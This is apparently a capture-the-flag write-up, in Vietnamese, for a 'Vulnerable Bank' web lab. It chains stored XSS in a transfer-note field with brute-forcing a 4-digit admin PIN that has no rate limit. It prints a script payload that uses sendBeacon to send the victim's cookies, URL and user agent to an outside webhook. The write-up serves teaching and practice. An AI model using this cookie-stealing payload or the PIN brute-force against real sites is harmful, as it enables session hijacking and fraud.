# Vulnerable Bank — Stored XSS & PIN Brute-force

- **Category**: Web Exploitation
- **Vulnerabilities**: Stored XSS (Cross-Site Scripting) & Weak PIN Brute-force

---

## 1. Khai thác Stored XSS đánh cắp Session Admin

Tại chức năng "Chuyển khoản nhanh" trong `/dashboard`, trường `content` (Nội dung chuyển khoản) không thực hiện mã hóa (HTML entity encoding) dữ liệu đầu vào trước khi lưu vào database và hiển thị ra giao diện.

Gửi payload JavaScript khai thác API `navigator.sendBeacon` để gửi cookie phiên về webhook của kẻ tấn công:

```html
<script>
  navigator.sendBeacon('https://webhook.com/', JSON.stringify({
    cookies: document.cookie,
    url: location.href,
    userAgent: navigator.userAgent
  }));
</script>
```

![Gửi payload Stored XSS](../assets/ctf/Pasted%20image%2020260721210621.png)

Khi Admin truy cập xem lịch sử giao dịch, payload sẽ được kích hoạt ngầm và gửi Cookie phiên của Admin về Webhook:

![Bắt session cookie của Admin](../assets/ctf/Pasted%20image%2020260721205537.png)

---

## 2. Truy cập Admin Panel & Brute-force mã PIN

Sử dụng Cookie của Admin để truy cập vào trang quản trị đặc quyền `/admin`. Tại đây có chức năng "Điều chỉnh số dư đặc quyền" nhưng bị khóa bằng mã PIN bảo vệ:

![Trang điều chỉnh số dư đặc quyền](../assets/ctf/Pasted%20image%2020260721205844.png)

Nhận thấy mã PIN chỉ gồm 4 chữ số (từ `0000` đến `9999`) và không có cơ chế Rate Limiting hay khóa tài khoản khi nhập sai nhiều lần.

Sử dụng Burp Suite Intruder hoặc script Python để vét cạn toàn bộ 10,000 khả năng của mã PIN:

![Brute force mã PIN 4 chữ số](../assets/ctf/Pasted%20image%2020260721211322.png)

Sau khi tìm được mã PIN chính xác, ta thực hiện chuyển số dư đủ để hoàn thành bài lab và lấy Flag.
